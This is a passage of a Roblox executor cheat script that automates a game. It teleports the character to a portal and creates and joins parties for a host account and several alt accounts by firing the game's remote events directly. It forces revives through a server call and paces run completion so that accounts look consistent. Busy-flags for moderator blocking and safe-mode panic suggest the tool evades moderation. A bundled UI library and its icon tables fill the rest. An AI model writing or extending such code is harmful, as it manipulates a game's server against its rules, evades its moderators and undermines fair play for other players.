        local ok,reason=pcall(ctx.Move,root,destination,now)
        if not ok then pollAt=now+2;status("Portal teleport retry · "..tostring(reason));return end
        pending={Root=root,Portal=portal,Point=destination,VerifyAt=now+1}
        status("Verifying arrival at AtheonPortal")
    end
    function api.Destroy()api.Reset();pollAt=math.huge end
    return api
end

-- END BUNDLED ATHEON UNLOCK
    end)()
    local function portalPoint(portal)
        local handlers={BasePart=function(object)return object.Position end,Model=function(object)return object:GetPivot().Position end,
            Attachment=function(object)return object.WorldPosition end}
        for class,resolve in pairs(handlers)do if portal:IsA(class)then return resolve(portal)end end
        local candidates=portal:QueryDescendants("BasePart")
        for _,part in ipairs(candidates)do if part:FindFirstChildOfClass("TouchTransmitter")then return part.Position end end
        return candidates[1]and candidates[1].Position
    end
    local function busy()
        for _,flag in ipairs({"StopEverything","ModeratorBlocking","SafeModePanic","AutoTradeBusy","AutomationTeleporting",
            "TravelBusy","AutoJoinFriendHolding","Dodging","Recovering"})do if state[flag]then return true end end
        return false
    end
    local controller=create({State=state,Busy=busy,Find=function()return workspace:FindFirstChild("AtheonPortal")end,
        Unlocked=function()return game.PlaceId==13965775911 or(state.IsAutomationFloorUnlocked and state.IsAutomationFloorUnlocked(13965775911))==true end,
        Root=function()
            if not livingPlayer(player)then return nil end
            local root=player.Character:FindFirstChild("HumanoidRootPart")
            return root and not root.Anchored and root or nil
        end,Position=portalPoint,Arrived=function(root,point)return root.Parent~=nil and(root.Position-point).Magnitude<=12 end,
        Move=function(root,point,at)
            if state.CancelSkillAura then state.CancelSkillAura("Atheon portal teleport")end
            stopSword(true);finishAttackBurst("Atheon portal teleport");stopMovement("Atheon portal teleport",true)
            state.FollowTarget=nil;state.FarmTargetLock=nil;state.FarmPauseUntil=at+2;state.AtheonUnlockPauseUntil=at+2
            pivotRoot(root,point)
        end})
    state.AtheonUnlockController=controller
    function state.SetAtheonUnlock(requested)
        state.AtheonUnlock=requested==true;controller.Reset()
        state.AtheonUnlockStatus=state.AtheonUnlock and "Waiting for AtheonPortal"or "Atheon Unlock is off"
        workScheduler.Wake("AtheonUnlock");requestSave()
    end
    taskController("AtheonUnlock",.5,controller.Update)
    table.insert(frameOrder,1,"AtheonUnlock")
end
local function installBetweenAutomation()
    local create=(function()
-- BEGIN BUNDLED BETWEEN ROOM
-- Native room setup is a receipt-driven transaction with a single start dispatch.
return function(ctx)
    local api={}
    local phase="Setup"
    local waiting,completedRoom
    local attempts=0
    local joinRoom,joinStatus,joinAttempts,nextJoin
    local starting=false
    local revision=0
    local leavingUntil
    local function stop(message)phase="Stopped";ctx.Status(message)end
    function api.Reset()
        revision+=1
        phase="Setup";waiting=nil;attempts=0;leavingUntil=nil
        joinRoom,joinStatus,joinAttempts,nextJoin=nil,nil,0,0
    end
    local function dispatch(action,field,room,now)
        attempts+=1
        if attempts>8 then stop("Room settings could not be applied. Check the native party menu.");return end
        waiting={Field=field,Before=room and room[field],Until=now+5}
        ctx.Status(room and "Configuring The Between"or "Creating The Between room")
        ctx.Send(action)
    end
    function api.Update(now)
        if phase~="Setup"or starting or not ctx.Active()then return end
        local room=ctx.Read()
        if ctx.PriorRoomId and room and room.Id==ctx.PriorRoomId then
            if not leavingUntil then
                leavingUntil=now+5;ctx.Send("LeaveParty")
            elseif now>=leavingUntil then stop("Previous party did not close. Toggle Start to retry.")end
            return
        end
        local assignment=ctx.Assignment and ctx.Assignment()
        local access,difficulty=ctx.Selection()
        if assignment and assignment.Role=="Alt" then
            local hostRoom=ctx.FindHostRoom(assignment.Host)
            if room then
                ctx.Status(hostRoom and room.Id==hostRoom.Id and "Joined host · waiting for the party"
                    or "Leave your current party to join "..assignment.Host)
            elseif not hostRoom then
                ctx.Status("Waiting for host "..assignment.Host.." in this server")
            elseif hostRoom.Status==access and hostRoom.Mode==difficulty then
                if joinRoom~=hostRoom.Id or joinStatus~=hostRoom.Status then
                    joinRoom,joinStatus,joinAttempts,nextJoin=hostRoom.Id,hostRoom.Status,0,0
                end
                if joinAttempts>=3 then
                    ctx.Status("Could not join the host. Check room access and toggle Start to retry.")
                elseif now>=nextJoin then
                    joinAttempts+=1;nextJoin=now+3
                    ctx.Status("Joining "..assignment.Host)
                    ctx.Send("JoinParty",hostRoom.Id)
                end
            end
            return
        elseif assignment and assignment.Role~="Host" then
            ctx.Status(assignment.Message or "Set a Host and Alt assignment for this account")
            return
        end
        if waiting then
            local changed=waiting.Field=="Id"and room or room and room[waiting.Field]~=waiting.Before
            if changed then waiting=nil
            elseif now>=waiting.Until then stop("Room request timed out. Toggle Start to retry.");return
            else return end
        end
        if room then
            if not(room.Id and room.Host~=nil and room.PlaceId~=nil)then ctx.Status("Waiting for party details");return end
            if room.Host~=ctx.UserId or room.PlaceId~=ctx.PlaceId then ctx.Status("Leave your current party to create a Between room");return end
            if room.Id==completedRoom or not(room.Status and room.Mode)then return end
        end
        if not room then attempts=0;dispatch("CreateParty","Id",nil,now);return end
        if room.Mode~=difficulty then dispatch("ToggleMode","Mode",room,now);return end
        if room.Status~=access then dispatch("ToggleStatus","Status",room,now);return end
        local missing=assignment and ctx.MissingAlts(room,assignment.Alts)
        if missing and #missing>0 then
            ctx.Status("Waiting for Alt: "..table.concat(missing,", "))
            return
        end
        starting=true
        local requestRevision=revision
        phase="Starting";ctx.Status("Starting The Between · "..access.." · "..difficulty)
        ctx.Spawn(function()
            if ctx.PrepareStart then ctx.PrepareStart() end
            local current=ctx.Read()
            local selected=ctx.Assignment and ctx.Assignment()
            local desiredAccess,desiredMode=ctx.Selection()
            if requestRevision~=revision or not ctx.Active() or not current or current.Id~=room.Id or current.Host~=ctx.UserId
                or current.PlaceId~=ctx.PlaceId or current.Status~=desiredAccess or current.Mode~=desiredMode
                or selected and (selected.Role~="Host" or #ctx.MissingAlts(current,selected.Alts)>0) then
                starting=false;phase="Setup"
                return
            end
            local ok,accepted=pcall(ctx.Start)
            starting=false
            if ok and accepted==true then completedRoom=room.Id;phase="Stopped";if ctx.Active()then ctx.Status("Start accepted · waiting for teleport")end
            elseif ctx.Active()then stop("Start failed. Check the native party menu and toggle Start to retry.")
            else phase="Stopped"end
        end)
    end
    return api
end

-- END BUNDLED BETWEEN ROOM
    end)()
    local destination=78945654064532
    local localFloor=game.PlaceId==destination
    local native=localFloor and require(services.UI.WaveDefense.Revive)
    local function prompt()return native and native.Frame and native.Frame.Visible end
    local function partyDefeated()
        for _,person in ipairs(Players:GetPlayers())do
            local lives=person:GetAttribute("Lives")
            if livingPlayer(person)or type(lives)~="number"or lives>0 then return false end
        end
        return true
    end
    local retry
    local function isChest(name)return name:lower():find("%f[%a]chest%f[%A]")~=nil end
    if localFloor then
        local makeRetry=(function()
-- BEGIN BUNDLED BETWEEN RETRY
-- A retry needs a stable party wipe or an observed final chest breaking.
return function(ctx)
    local wipeAt,ready
    local chests={}
    local bossHealth
    local api={}
    function api.Observe(mob,health)
        if ready then return end
        local name=mob.Name
        if name=="Rubricatus, The Sentinel of Order" then
            if ctx.Wave()==100 then bossHealth=health end
        elseif health.Value>0 and not chests[mob] and ctx.IsChest(name) then
            if bossHealth and bossHealth.Value<=0 and ctx.Wave()==100 then
                chests[mob]={Health=health}
            end
        end
    end
    function api.Update(now)
        if ready then return ready end
        local wave,mobsLeft=ctx.Wave()
        if type(wave)~="number" or wave<1 then return end
        if ctx.PartyDefeated() then
            wipeAt=wipeAt or now
            if now-wipeAt>=1 then ready="Wipe";return ready end
        else
            wipeAt=nil
        end
        if wave~=100 then return end
        local rewards,enemyCount=ctx.Chests()
        if not bossHealth or bossHealth.Value>0 or enemyCount>0 then return end
        local count=0
        for chest,health in pairs(rewards)do
            if health.Value>0 then count+=1 end
        end
        -- The final boss must have cleared before admitting the remaining chest mobs.
        if type(mobsLeft)=="number" and mobsLeft<=count then
            for chest,health in pairs(rewards)do
                if health.Value>0 and not chests[chest] then chests[chest]={Health=health} end
            end
        end
        if next(chests)==nil or count>0 or (mobsLeft~=nil and mobsLeft~=0) then return end
        for _,receipt in pairs(chests)do
            if receipt.Health.Value>0 then return end
            receipt.At=receipt.At or now
            if now-receipt.At<1 then return end
        end
        ready="Chest"
        return ready
    end
    return api
end

-- END BUNDLED BETWEEN RETRY
        end)()
        retry=makeRetry({
            Wave=function()return workspace:GetAttribute("Wave"),workspace:GetAttribute("MobsLeft")end,
            PartyDefeated=partyDefeated,
            IsChest=isChest,
            Chests=function()
                local chests,enemies={},0
                local folder=refreshMobIndex()
                if not folder then return chests,1 end
                for mob in pairs(trackedMobs)do
                    local data=getMobData(mob)
                    if isChest(mob.Name) then
                        if data then chests[mob]=data.Health else enemies+=1 end
                    elseif not data or data.Health.Value>0 then enemies+=1 end
                end
                return chests,enemies
            end,
        })
    end
    if localFloor then
        local receipt,busy
        taskController("BetweenRevive",.35,function()
            if livingPlayer(player)then receipt=nil;return end
            local lives=player:GetAttribute("Lives")
            if busy or not prompt()or type(lives)~="number"or lives<=0 or receipt==lives then return end
            receipt=lives;busy=true
            task.spawn(function()
                local permitted=state.Running and not state.StopEverything and prompt()
                    and player:GetAttribute("Lives")==lives and not livingPlayer(player)
                if permitted then
                    local ok,accepted=pcall(ReplicatedStorage.Function.InvokeServer,ReplicatedStorage.Function,
                        "UniqueFloorTypes",{"WaveDefense","Revive"})
                    if ok and accepted and native.Hide then native.Hide()end
                end
                busy=false
            end)
        end)
        frameOrder[#frameOrder+1]="BetweenRevive"
    end
    local allowedAccess={Private=true,Friends=true,["Game Party"]=true}
    local allowedDifficulty={Normal=true,Hard=true,Elite=true}
    if not allowedAccess[state.BetweenAccess]then state.BetweenAccess="Private"end
    if not allowedDifficulty[state.BetweenDifficulty]then state.BetweenDifficulty="Normal"end
    local function minute(value)
        return type(value)=="number" and value==value and math.clamp(math.round(value),0,100) or 0
    end
    local pace={}
    for mode in pairs(allowedDifficulty)do
        local value=type(state.BetweenPace)=="table" and state.BetweenPace[mode]
        local minimum=minute(type(value)=="table" and value.Min or value)
        local maximum=type(value)=="table" and minute(value.Max)
            or math.min(100,minimum+(minimum>0 and 1 or 0))
        pace[mode]={Min=minimum,Max=math.max(minimum,maximum)}
    end
    state.BetweenPace=pace
    function state.SetBetweenPace(mode,minimum,maximum)
        if not allowedDifficulty[mode] then return end
        minimum,maximum=minute(minimum),minute(maximum)
        pace[mode]={Min=minimum,Max=math.max(minimum,maximum)}
        requestSave()
    end
    if localFloor then
        local makePace=(function()
-- BEGIN BUNDLED BETWEEN PACE
return function(jobId)
    -- Accounts using the same range in the same run pick the same second.
    local hash=0
    for i=1,#jobId do hash=(hash*31+jobId:byte(i))%65521 end
    local lastWave,peak
    return function(range,wave,runTime,remaining,survival,finalHealth)
        if not range or range.Max==0 then return false end
        local first,last=range.Min*60,range.Max*60
        local goal=first+hash%(last-first+1)
        local h,m,s=tostring(runTime or ""):match("^(%d+):(%d+):(%d+)$")
        local elapsed=h and (tonumber(h)*3600+tonumber(m)*60+tonumber(s))
        if not elapsed or type(wave)~="number" or wave<1 or wave>100 then return false,goal end
        if wave~=lastWave then lastWave=wave;peak=0 end
        remaining=math.max(0,tonumber(remaining) or 0)
        peak=math.max(peak,remaining)
        if survival or remaining==0 then return false,goal,elapsed end
        local progress=(peak-remaining)/math.max(1,peak)
        local release=(wave-1+progress)*goal/100
        if wave==100 and remaining==1 and finalHealth and finalHealth<=.15 then release=goal end
        return elapsed<release,goal,elapsed,release
    end
end

-- END BUNDLED BETWEEN PACE
        end)()
        local getPace=makePace(game.JobId)
        taskController("BetweenPace",.2,function()
            local mode=workspace:GetAttribute("WaveDefenseMode")
            local wave=workspace:GetAttribute("Wave")
            local progress=workspace:GetAttribute("WaveProgressLeft")
            local mobs=workspace:GetAttribute("MobsLeft")
            local note=tostring(workspace:GetAttribute("CountdownNote") or ""):lower()
            local environment=workspace:GetAttribute("WaveDefenseEnvironment")
            local finalHealth
            if wave==100 and mobs==1 and state.FollowTarget then
                local data=getMobData(state.FollowTarget)
                if data then
                    local maximum=data.Health:GetAttribute("MaxValue") or data.Entity:GetAttribute("MaxHealth")
                    local value=data.Entity:FindFirstChild("MaxHealth")
                    maximum=tonumber(maximum or (value and value.Value))
                    if maximum and maximum>0 then finalHealth=data.Health.Value/maximum end
                end
            end
            local hold,goal,elapsed,release=getPace(pace[mode],wave,workspace:GetAttribute("WDRunTime"),
                progress or mobs,environment=="Blackout" or environment=="Darkness" or note:find("survive",1,true)~=nil,finalHealth)
            if hold and not state.BetweenPaceHolding then
                finishAttackBurst("Between completion pace")
                state.CancelSkillAura("Between completion pace")
            end
            state.BetweenPaceHolding=hold
            state.BetweenPaceStatus=goal and string.format("Goal %d:%02d · %s",math.floor(goal/60),goal%60,
                hold and ("waiting "..math.ceil(release-elapsed).."s") or "combat ready") or "Completion pacing is off"
        end)
        table.insert(frameOrder,1,"BetweenPace")
    end
    local function normalizeAlts(value)
        local names,seen={},{}
        for name in value:gmatch("[^,%s;.]+")do
            name=name:gsub("^@","")
            local key=name:lower()
            if name~="" and not seen[key] then
                seen[key]=true;names[#names+1]=name
            end
        end
        return table.concat(names,", ")
    end
    local rooms={}
    if type(state.BetweenRooms)=="table" then
        for i,entry in ipairs(state.BetweenRooms)do
            if i>20 then break end
            if type(entry)=="table" then
                rooms[#rooms+1]={
                    Host=type(entry.Host)=="string" and entry.Host:sub(1,64) or "",
                    Alt=type(entry.Alt)=="string" and normalizeAlts(entry.Alt:sub(1,256)) or "",
                    Mode=allowedAccess[entry.Mode] and entry.Mode or state.BetweenAccess,
                    Difficulty=allowedDifficulty[entry.Difficulty] and entry.Difficulty or state.BetweenDifficulty,
                    Start=entry.Start==true,
                    AutoRetry=entry.AutoRetry==true,
                }
            end
        end
    end
    state.BetweenRooms=rooms
    local function matches(person,name)
        return person.Name:lower()==name:lower() or tostring(person.UserId)==name
    end
    local function hostName(entry)
        return entry.Host:match("^%s*@?([%w_]+)%s*$")
    end
    function state.IsBetweenRoomHost(index)
        local entry=rooms[index]
        local name=entry and hostName(entry)
        return name~=nil and matches(player,name)
    end
    local function findPlayer(name)
        for _,person in ipairs(Players:GetPlayers())do
            if matches(person,name) then return person end
        end
    end
    local assignment
    local function updateAssignment()
        assignment=nil
        state.AutoCreateBetween=false
        for _,entry in ipairs(rooms)do
            if not entry.Start then continue end
            local host=hostName(entry)
            local alts,seen={},{}
            local isAlt,invalid=false,false
            for token in entry.Alt:gmatch("[^,%s;]+")do
                local name=token:gsub("^@","")
                local key=name:lower()
                if not name:match("^[%w_]+$") or #name>20 then invalid=true
                elseif not seen[key] then
                    seen[key]=true
                    alts[#alts+1]=name
                    if matches(player,name) then isAlt=true end
                end
            end
            local isHost=host and matches(player,host)
            if isHost or isAlt then
                if assignment or (isHost and isAlt) then
                    assignment={Role="Invalid",Message="This account has conflicting room assignments"}
                    break
                end
                if invalid or not host or #host>20 or #alts>7 then
                    assignment={Role="Invalid",Message="Enter one Host and up to seven Alt usernames or user IDs"}
                else
                    assignment={Role=isHost and "Host" or "Alt",Host=host,Alts=alts,Room=entry}
                end
            end
        end
        assignment=assignment or {Role="Unassigned"}
        state.AutoCreateBetween=assignment.Room~=nil
        state.ObserveBetweenReward=retry and assignment.Role=="Host" and assignment.Room.AutoRetry and retry.Observe or nil
    end
    updateAssignment()
    local index
    local function roomSnapshot(person)
        local id=(person or player):GetAttribute("PartyID")
        if not id then return nil end
        local parties=ReplicatedStorage:FindFirstChild("LobbyParties")
        local party=parties and parties:FindFirstChild(tostring(id))
        local view={Id=tostring(id),Instance=party}
        if party then for _,field in ipairs({"Host","PlaceId","Status","Mode"})do view[field]=party:GetAttribute(field)end end
        return view
    end
    local function send(action,partyId)
        if action=="CreateParty"and index==nil then
            for ordinal,floor in ipairs(require(ReplicatedStorage.Database.Locations).floors)do
                if floor.PlaceId==destination then index=ordinal;break end
            end
            assert(index,"The Between is unavailable")
        end
        ReplicatedStorage.Event:FireServer("UniqueFloorTypes",{"Parties",action,action=="CreateParty"and index or partyId})
    end
    local function findHostRoom(name)
        local host=findPlayer(name)
        local found=host and roomSnapshot(host)
        if found and found.Host==host.UserId and found.PlaceId==destination then return found end
    end
    local priorRoom=localFloor and roomSnapshot() or nil
    local controller=create({UserId=player.UserId,PlaceId=destination,Read=roomSnapshot,Send=send,Spawn=task.spawn,
        PriorRoomId=priorRoom and priorRoom.Id,
        Active=function()
            if not state.Running or not state.AutoCreateBetween or state.StopEverything or state.AutomationTeleporting or state.TravelBusy then return false end
            if not localFloor then return true end
            if state.SafeMode and state.SafeController and state.SafeController.Seeking then return false end
            if assignment.Role=="Alt" then
                local hostRoom=findHostRoom(assignment.Host)
                return hostRoom~=nil and (not priorRoom or hostRoom.Id~=priorRoom.Id)
                    and (partyDefeated() or (workspace:GetAttribute("Wave")==100 and (workspace:GetAttribute("MobsLeft")or 0)==0))
            end
            return assignment.Room.AutoRetry and retry.Update(os.clock())~=nil
        end,
        Assignment=function()return assignment end,
        FindHostRoom=findHostRoom,
        MissingAlts=function(current,names)
            local missing={}
            for _,name in ipairs(names)do
                local alt=findPlayer(name)
                if not alt or not current.Instance or tostring(alt:GetAttribute("PartyID"))~=current.Id
                    or current.Instance:GetAttribute(tostring(alt.UserId))==nil then
                    missing[#missing+1]=name
                end
            end
            return missing
        end,
        Selection=function()
            local room=assignment.Room
            if room then return room.Mode,room.Difficulty end
        end,
        Status=function(message)state.BetweenRoomStatus=message end,
        PrepareStart=function()if state.QueueAutomation then pcall(state.QueueAutomation)end end,
        Start=function()
            return ReplicatedStorage.Function:InvokeServer("UniqueFloorTypes",{"Parties","Start"})
        end})
    state.BetweenRoomController=controller
    function state.AddBetweenRoom()
        if #rooms>=20 then
            state.BetweenRoomStatus="Room setup limit reached"
            return
        end
        rooms[#rooms+1]={Host="",Alt="",Mode="Private",Difficulty="Normal",Start=false,AutoRetry=false}
        requestSave()
        return #rooms
    end
    function state.RemoveBetweenRoom(index)
        if not rooms[index]then return false end
        local previous=assignment.Room
        table.remove(rooms,index)
        updateAssignment()
        if assignment.Room~=previous then controller.Reset()end
        requestSave()
        return true
    end
    function state.SetBetweenRoomField(index,field,value)
        local entry=rooms[index]
        if not entry then return end
        if field=="Host" and type(value)=="string" then value=value:sub(1,64)
        elseif field=="Alt" and type(value)=="string" then
            value=normalizeAlts(value)
            if #value>256 then return entry.Alt end
        elseif field=="Mode" and allowedAccess[value] then
        elseif field=="Difficulty" and allowedDifficulty[value] then
        elseif field=="Start" and type(value)=="boolean" then
        elseif field=="AutoRetry" and type(value)=="boolean" and state.IsBetweenRoomHost(index) then
        else return end
        if entry[field]~=value then
            local previous=assignment.Room
            entry[field]=value
            updateAssignment()
            if previous==entry or assignment.Room~=previous then controller.Reset()end
            requestSave()
        end
        return value
    end
    taskController("BetweenRoom",.35,controller.Update);frameOrder[#frameOrder+1]="BetweenRoom"
end
installBetweenAutomation()
do
local function initializeModernUI()
-- WindUI is bundled at a fixed release; no compatibility window exists.
-- Executor adapter for the sole modern presentation.
do
    local librarySource=(function()
-- BEGIN BUNDLED WINDUI SOURCE
return [==========[
--[[
MIT License

Copyright (c) 2026 Footages

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

]]
--[[
     _      ___         ____  ______
    | | /| / (_)__  ___/ / / / /  _/
    | |/ |/ / / _ \/ _  / /_/ // /
    |__/|__/_/_//_/\_,_/\____/___/

    v1.6.65  |  2026-07-01  |  Roblox UI Library for scripts

    To view the source code, see the `src/` folder on the official GitHub repository.

    Author: Footagesus (Footages, .ftgs, oftgs)
    Github: https://github.com/Footagesus/WindUI
    Discord: https://discord.gg/ftgs-development-hub-1300692552005189632
    License: MIT
]]

type ConfigType__DARKLUA_TYPE_a={
Object:Instance,
Camera:Instance?,
Interactive:boolean?,
Height:number?,
Focused:boolean,

Window:any,
WindUI:any,
Tab:any,
Parent:Instance,
}local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}end return a.cache[b].c end}do function a.a()

local b

local d={
New=nil,
Init=nil,
Shapes={
Circle={
Image="rbxassetid://111665032676235",
Rect=Rect.new(512,512,512,512),
Radius=512,
},
CircleOutline={
Image="rbxassetid://108556680453287",
Rect=Rect.new(512,512,512,512),
Radius=512,
},
CircleGlass={
Image="rbxassetid://95600044758841",
Rect=Rect.new(512,512,512,512),
Radius=512,
},



SquircleH={
Image="rbxassetid://125083578015333",
Rect=Rect.new(512,325,512,325),
Radius=325,
},
SquircleHOutline={
Image="rbxassetid://107043713170567",
Rect=Rect.new(512,325,512,325),
Radius=325,
},
SquircleHGlass={
Image="rbxassetid://84819521201001",
Rect=Rect.new(512,325,512,325),
Radius=325,
},
["SquircleH-TL-TR"]={
Image="rbxassetid://90680657206619",
Rect=Rect.new(807,512,807,512),
Radius=325,
AutoChange=false,
},
["SquircleH-BL-BR"]={
Image="rbxassetid://99216342056719",
Rect=Rect.new(0,512,0,512),
Radius=325,
AutoChange=false,
},

SquircleV={
Image="rbxassetid://124965260437653",
Rect=Rect.new(325,512,325,512),
Radius=325,
},
SquircleVOutline={
Image="rbxassetid://88808835404198",
Rect=Rect.new(325,512,325,512),
Radius=325,
},
SquircleVGlass={
Image="rbxassetid://124982801466667",
Rect=Rect.new(325,512,325,512),
Radius=325,
},

Squircle={
Image="rbxassetid://89641024074289",
Rect=Rect.new(460,460,460,460),
Radius=310,
},
SquircleOutline={
Image="rbxassetid://74029063732681",
Rect=Rect.new(512,512,512,512),
Radius=310,
},
SquircleGlass={
Image="rbxassetid://131126436897551",
Rect=Rect.new(512,512,512,512),
Radius=310,
},

["Squircle-TL-TR"]={
Image="rbxassetid://75712142040725",
Rect=Rect.new(512,512,512,512),
Radius=310,
AutoChange=false,
},
["Squircle-BL-BR"]={
Image="rbxassetid://83676684425544",
Rect=Rect.new(512,0,512,0),
Radius=310,
AutoChange=false,
},Square=
{
Image="rbxassetid://82909646051652",
Rect=Rect.new(512,512,512,512),
Radius=512,
AutoChange=false,
},
},
}

function d.Init(e,f)
b=f
return e.New
end

function d.New(e,f,g,h,i,j,l)
local m={
Radius=f or 0,
Type=g or"Circle",
GetRadius=nil,
GetType=nil,
SetRadius=nil,
SetType=nil,
}

local p={
["Glass-0.7"]="SquircleGlass",
["Glass-1"]="SquircleGlass",
["Glass-1.4"]="SquircleGlass",
["Squircle-Outline"]="SquircleOutline",
}

local function GetShape(r)
return d.Shapes[p[r]or r]or d.Shapes.Circle
end

local r=b.New(j and"ImageButton"or"ImageLabel",{
Image="",
ScaleType=l~=false and"Slice"or nil,
SliceCenter=m.Type~="Squircle"and Rect.new(512,512,512,512)or nil,
SliceScale=1,
ThemeTag=h and h.ThemeTag or nil,
BackgroundTransparency=1,
},i)

for u,v in next,h do
if not table.find({"ThemeTag"},u)then
r[u]=v
end
end

function m.SetRadius(u,v)
m.Radius=v
r.SliceScale=math.max(v/GetShape(m.Type).Radius,0.0001)
return m
end

function m.SetType(u,v)
m.Type=v
local x=GetShape(v)
r.Image=x.Image
r.SliceCenter=x.Rect
m:SetRadius(m.Radius)
return m
end

function m.GetRadius(u)
return m.Radius
end

function m.GetType(u)
return m.Type
end

m:SetRadius(f)
m:SetType(g)

b.AddSignal(r:GetPropertyChangedSignal"AbsoluteSize",function()
local u=GetShape(m.Type)
if u.AutoChange==false then
return
end

if string.find(m.Type,"Squircle")then
local v=string.find(m.Type,"Glass")and"Glass"or nil
local x=string.find(m.Type,"Outline")and"Outline"or nil

local z=math.round(r.AbsoluteSize.X/b.UIScale)
local A=math.round(r.AbsoluteSize.Y/b.UIScale)

local B=m.Radius~=0 and m.Radius or math.min(z,A)/2
local C=d.Shapes.Squircle.Radius/1024
local F=B/math.min(z,A)

local G

if z>A then
if F>=C then
G="SquircleH"..(x or v or"")
else
G="Squircle"..(x or v or"")
end
elseif z<A then
if F>=C then
G="SquircleV"..(x or v or"")
else
G="Squircle"..(x or v or"")
end
else
if F>=C then
G="Circle"..(x or v or"")
else
G="Squircle"..(x or v or"")
end
end

if G~=m:GetType()then
m:SetType(G)
end
end
end)

return r,m
end

return d end function a.b()

local b=(cloneref or clonereference or function(b)return b end)

local d={Icons={lucide=(function()
--[[
MIT License

Copyright (c) 2025 Footages

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
]]
-- This file is automatically @generated by Tree Hub CLI.

return {
	["a-arrow-down"] = "rbxassetid://92867583610071",
	["a-arrow-up"] = "rbxassetid://132318504999733",
	["a-large-small"] = "rbxassetid://111491496660216",
	["accessibility"] = "rbxassetid://114029945302017",
	["activity"] = "rbxassetid://94212016861936",
	["air-vent"] = "rbxassetid://81517226012329",
	["airplay"] = "rbxassetid://115020759309179",
	["alarm-clock-check"] = "rbxassetid://76437352099157",
	["alarm-clock-minus"] = "rbxassetid://77364179863205",
	["alarm-clock-off"] = "rbxassetid://97904885874823",
	["alarm-clock-plus"] = "rbxassetid://80468822979214",
	["alarm-clock"] = "rbxassetid://126259032907535",
	["alarm-smoke"] = "rbxassetid://96965448419685",
	["album"] = "rbxassetid://127358331163602",
	["align-center-horizontal"] = "rbxassetid://81570549209434",
	["align-center-vertical"] = "rbxassetid://118470463752466",
	["align-end-horizontal"] = "rbxassetid://139502909745427",
	["align-end-vertical"] = "rbxassetid://96528869059554",
	["align-horizontal-distribute-center"] = "rbxassetid://97220086126656",
	["align-horizontal-distribute-end"] = "rbxassetid://106128590702022",
	["align-horizontal-distribute-start"] = "rbxassetid://76074660002997",
	["align-horizontal-justify-center"] = "rbxassetid://75732302772427",
	["align-horizontal-justify-end"] = "rbxassetid://129167626402283",
	["align-horizontal-justify-start"] = "rbxassetid://130161830325281",
	["align-horizontal-space-around"] = "rbxassetid://91646106782950",
	["align-horizontal-space-between"] = "rbxassetid://103886093046990",
	["align-start-horizontal"] = "rbxassetid://125674804697729",
	["align-start-vertical"] = "rbxassetid://105020230154823",
	["align-vertical-distribute-center"] = "rbxassetid://93791183635525",
	["align-vertical-distribute-end"] = "rbxassetid://139354223511433",
	["align-vertical-distribute-start"] = "rbxassetid://74961997822126",
	["align-vertical-justify-center"] = "rbxassetid://134754696166569",
	["align-vertical-justify-end"] = "rbxassetid://92569381441969",
	["align-vertical-justify-start"] = "rbxassetid://99692844572718",
	["align-vertical-space-around"] = "rbxassetid://96206012459190",
	["align-vertical-space-between"] = "rbxassetid://124998077349706",
	["ambulance"] = "rbxassetid://78599995190651",
	["ampersand"] = "rbxassetid://75272915739209",
	["ampersands"] = "rbxassetid://126947193455996",
	["amphora"] = "rbxassetid://137370389604364",
	["anchor"] = "rbxassetid://92181172123618",
	["angry"] = "rbxassetid://74237056000103",
	["annoyed"] = "rbxassetid://80064369052011",
	["antenna"] = "rbxassetid://99628923540956",
	["anvil"] = "rbxassetid://100203029845919",
	["aperture"] = "rbxassetid://83396154449972",
	["app-window-mac"] = "rbxassetid://79587216113811",
	["app-window"] = "rbxassetid://93142176757189",
	["apple"] = "rbxassetid://104349242902442",
	["archive-restore"] = "rbxassetid://78956681942188",
	["archive-x"] = "rbxassetid://75830115088395",
	["archive"] = "rbxassetid://122180020814574",
	["armchair"] = "rbxassetid://105384358373973",
	["arrow-big-down-dash"] = "rbxassetid://137987229582002",
	["arrow-big-down"] = "rbxassetid://81081164158885",
	["arrow-big-left-dash"] = "rbxassetid://97827621354677",
	["arrow-big-left"] = "rbxassetid://85973092492641",
	["arrow-big-right-dash"] = "rbxassetid://117825834972403",
	["arrow-big-right"] = "rbxassetid://82960676755590",
	["arrow-big-up-dash"] = "rbxassetid://99260194327483",
	["arrow-big-up"] = "rbxassetid://93136954756149",
	["arrow-down-0-1"] = "rbxassetid://120961896217875",
	["arrow-down-1-0"] = "rbxassetid://93474255891850",
	["arrow-down-a-z"] = "rbxassetid://99554596207900",
	["arrow-down-from-line"] = "rbxassetid://132045845807798",
	["arrow-down-left"] = "rbxassetid://102899325237364",
	["arrow-down-narrow-wide"] = "rbxassetid://129105261655061",
	["arrow-down-right"] = "rbxassetid://123109928624974",
